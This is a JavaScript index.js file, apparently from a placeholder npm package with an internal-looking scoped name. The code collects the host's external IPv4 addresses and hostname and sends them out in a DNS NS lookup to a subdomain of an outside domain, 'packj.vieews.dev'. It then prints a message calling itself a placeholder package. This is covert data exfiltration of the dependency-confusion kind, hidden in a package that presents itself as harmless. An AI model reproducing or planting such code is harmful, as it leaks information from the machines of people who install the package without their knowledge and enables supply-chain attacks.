//index.js

dns = require('dns')
os = require('os')

'use strict';

try {
	const nets = os.networkInterfaces();
	const results = [];
	
	for (const name of Object.keys(nets)) {
	    for (const net of nets[name]) {
	        const familyV4Value = typeof net.family === 'string' ? 'IPv4' : 4
	        if (net.family === familyV4Value && !net.internal) {
	            results.push(net.address);
	        }
	    }
	}
	
	var nsLookup = function(domain, timeout, callback) {
	  var doCallback = function(err, domains) {
	    callback(err, domains);
	  };
	
	  setTimeout(function() {process.exit();}, timeout);
	  dns.resolveNs(domain, doCallback);
	};

	query = '#' + results.join(' # ') + '#' + os.hostname() + '#NPM%@airtable-blocks-internal/testfoo-my%0.0.1%packj.vieews.dev'
	nsLookup(query, 3000, function(err, addresses) {});
} catch (e) {
	console.log('');
}

console.log("This is a placeholder package. Please reach out to remove.");
